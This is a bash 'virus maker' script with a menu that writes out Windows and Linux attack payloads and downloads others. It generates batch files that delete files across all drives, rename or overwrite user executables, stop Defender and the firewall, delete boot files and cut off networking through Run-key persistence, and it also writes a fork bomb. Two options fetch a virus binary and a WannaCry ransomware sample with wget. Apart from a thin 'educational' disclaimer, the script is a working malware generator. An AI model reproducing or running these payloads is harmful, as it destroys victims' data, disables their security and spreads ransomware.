#!/bin/bash


RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" YELLOW="$(printf '\033[1;33m')" GRAY="$(printf '\033[1;30m')"

Need() {
	command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}I require wget but it's not installed. Waiting few seconds .." ; sudo apt install wget; }
	command -v figlet toilet > /dev/null 2>&1 || { echo >&2 "${RED}I require figlet toilet but it's not installed. Waiting few seconds .." ; sudo apt install figlet toilet ; }
}

Menu() {

printf "${CYAN}[1]${MAGENTA} CmdLoop                                       ${CYAN}[2]${MAGENTA} Worm          \n"  
printf "${CYAN}[3]${MAGENTA} ReNameFile                                    ${CYAN}[4]${MAGENTA} FormatWindows \n"
printf "${CYAN}[5]${MAGENTA} Infect[Worm]                                  ${CYAN}[6]${MAGENTA} LinuxBomb     \n"
printf "${CYAN}[7]${MAGENTA} Run An App with Invisible [*.vbs]             ${CYAN}[8]${MAGENTA} InfectEXE     \n"
printf "${CYAN}[9]${MAGENTA} CVirus [Require Internet]                     ${CYAN}[10]${MAGENTA} Disable AntiVirus    \n"
printf "${CYAN}[11]${MAGENTA} CrashPC                                      ${CYAN}[12]${MAGENTA} Ransomware [WannaCry] [Require Internet]  \n"    
printf "${CYAN}[13]${MAGENTA} Alart Loop                                   ${CYAN}[14]${MAGENTA} Disable Network            \n"

printf "\n"
read -p "${GREEN}Enter Option: ${RED}" option

if [[ $option == 1 ]]; then
	CmdLoop

elif [[ $option == 2 ]]; then
	Worm

elif [[ $option == 3 ]]; then
	ReNameFile

elif [[ $option == 4 ]]; then
	FormatWindows

elif [[ $option == 5 ]]; then
	Infect

elif [[ $option == 6 ]]; then 
	LinuxBomb

elif [[ $option == 7 ]]; then
	Invisible

elif [[ $option == 8 ]]; then
       	InfectEXE

elif [[ $option == 9 ]]; then
    	Cvirus
elif [[ $option == 10 ]]; then
   	DisableAntiVirus

elif [[ $option == 11 ]]; then
	CrashPC

elif [[ $option == 12 ]]; then
	Ransomware

elif [[ $option == 13 ]]; then
	AlartLoop

elif [[ $option == 14 ]]; then
	DisableNet

else
    echo  "InVaild Options ...."
    sleep 2
    clear ; Banner1 ; Banner2 ; Menu 
fi
}
default_directory=$home

CmdLoop() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 2
	echo "@echo off " > $save/Output.bat
	echo ":Loop" >> $save/Output.bat
	echo "start" >> $save/Output.bat
	echo "goto :Loop" >> $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi

}

Worm() {
    echo  "Sorry Not Available" > log.txt
	echo "This is the only paid version you will get" >> log.txt
	status=$(cat log.txt | grep -o "Not Available")
	echo -e "${CYAN}Status: ${RED}" $status
	echo "${CYAN}Waiting..."
	sleep 5
	printf "\n${RED}This is the only paid version you will get\n"
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi

}

ReNameFile() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 2
	echo "for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)" > $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi

}

FormatWindows() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 3
	echo "for %%E In (A,B,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (del %%E:\*.* /F /Q >NUL )" > $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

Infect() {
	echo  "Sorry Not Available" > log.txt
	echo "This is the only paid version you will get" >> log.txt
	status=$(cat log.txt | grep -o "Not Available")
	echo -e "${CYAN}Status: ${RED}" $status
	echo "${CYAN}Waiting..."
	sleep 5
	printf "\n${RED}This is the only paid version you will get\n"
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

LinuxBomb() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	echo ":(){ :|: & };:" > $save/Output.sh
	if [[ -e $save/Output.sh ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then
	printf "${RED}Good Bye ^_^\n" 
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

Invisible() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 5
	echo "Set objShell = CreateObject("WScript.Shell")" > $save/Output.vbs
	echo "strCommand = "Program_Path"" >> $save/Output.vbs
	echo "objShell.Run strCommand, vbHide, TRUE" >> $save/Output.vbs
	if [[ -e $save/Output.vbs ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

InfectEXE() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 3
	echo "for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy /y %0 %%f)" > $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then
	printf "${RED}Good Bye ^_^\n" 
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

Cvirus() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Downloading Payload ....\n"
	sleep 3
	wget https://raw.githubusercontent.com/Anish-M-code/Cstorm-windows-startup-virus-in-c/master/Binaries/cstorm.exe > /dev/null 2>&1
	if [[ -e $save/cstorm.exe ]]; then
	mv $save/cstorm.exe $save/Output.exe
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory or Check Your Internet Connection ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then
	printf "${RED}Good Bye ^_^\n" 
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

DisableAntiVirus() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 5
	echo "net stop 'SDRSVC'" > $save/Output.bat
    echo "net stop 'WinDefend'" >> $save/Output.bat
    echo "taskkill /f /t /im 'MSASCui.exe'" >> $save/Output.bat
    echo "net stop 'security center'" >> $save/Output.bat
    echo "netsh firewall set opmode mode-disable" >> $save/Output.bat
    echo "net stop 'wuauserv'" >> $save/Output.bat
    echo "net stop 'Windows Defender Service'" >> $save/Output.bat
    echo "net stop 'Windows Firewall'" >> $save/Output.bat
    echo "net stop 'sharedaccess'" >> $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op 
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi

}

CrashPC() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 5
	echo "@echo off" > $save/Output.bat
	echo "shutdown -r - t 10 -c 'PC will Crash in 10 sec'" >> $save/Output.bat
	echo "attrib -r -s -h C:boot.ini" >> $save/Output.bat
	echo "@del C:boot.ini" >> $save/Output.bat
	echo "attrib -s -r - h C:windowswin.ini" >> $save/Output.bat
	echo "@del C:windowswin.ini" >> $save/Output.bat 
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op 
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

Ransomware() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Downloading Payload ....\n"
	sleep 3
	wget https://raw.githubusercontent.com/manashma/WannaCry/main/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe > /dev/null 2>&1
	if [[ -e $save/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe ]]; then
	mv $save/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe $save/Output.exe
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory or Check Your Internet Connection ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then
	printf "${RED}Good Bye ^_^\n" 
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

AlartLoop() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 2
	echo "do" > $save/Output.vbs
	echo "msgbox'Your message here' , 48 , 'AlartLoop'" >> $save/Output.vbs
	echo "loop" >> $save/Output.vbs
	if [[ -e $save/Output.vbs ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op 
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

DisableNet() {
	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
	save="${save:-${default_directory}}"
	printf "${CYAN}Building Payload ....\n"
	sleep 5
	echo "echo @echo off>c:windowswimn32.bat" > $save/Output.bat
	echo "echo break off>>c:windowswimn32.bat" >> $save/Output.bat
	echo "echo ipconfig/release_all>>c:windowswimn32.bat" >> $save/Output.bat
	echo "echo end>>c:windowswimn32.bat" >> $save/Output.bat
	echo "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f" >> $save/Output.bat
	echo "reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" >> $save/Output.bat
	echo "echo Now, You Lost Your Connection!" >> $save/Output.bat
	echo "PAUSE" >> $save/Output.bat
	if [[ -e $save/Output.bat ]]; then
	printf "${CYAN}Status: ${GREEN}Success ...\n"
	else 
	printf "${RED}Status: ${RED}Failed ...\n"
	printf "${RED}Enter Vaild Directory ...\n"
	fi
	read -p "${ORANGE}Do you restart it [Y/N]: " op 
	if [[ $op == Y ]] | [[ $op == y ]]; then 
	{ clear ; Banner1 ; Banner2 ; echo ; }
	sleep 2
	Menu
	elif [[ $op == N ]] | [[ $op == n ]]; then 
	printf "${RED}Good Bye ^_^\n"
	exit 0
	else
	echo "${RED}Enter Vaild Option ..."
	exit 1
	fi
}

Banner1() {
	clear
	printf "${YELLOW}Welcome to Kart or Manash Virus Maker (v1.1)\n"
	figlet Kart VM
	printf "\n"
	printf "Thanks for shopping with Kart Virus Maker\n"
}

Banner2() {
	date=$("date")
	printf "${GREEN}[-] Tool Created by Kart Studio (Manash Mahanta)\n"
	printf "${GREEN}[-] Only use for educational purporses!!\n"
	printf "${RED}[-] Author : Manash Mahanta \n"
	printf "${GRAY}[-] Contact Me : beastbattle24@gmail.com for any issue\n"
	printf "${YELLOW}[-]Website: https://www.hacknetbite.blogspot.com\n"
	
	printf "\n"
	printf "${BLUE} #########################################################################\n"
	printf "${BLUE} |           Warning use only you own desktop environment                |\n"
	printf "${BLUE} #########################################################################\n"
	printf "\n"
	printf "${GREEN}[#]Started On 👻👻👻 >>> ${YELLOW}$date \n"
	printf "\n"
	
}

Need
Banner1
Banner2
Menu
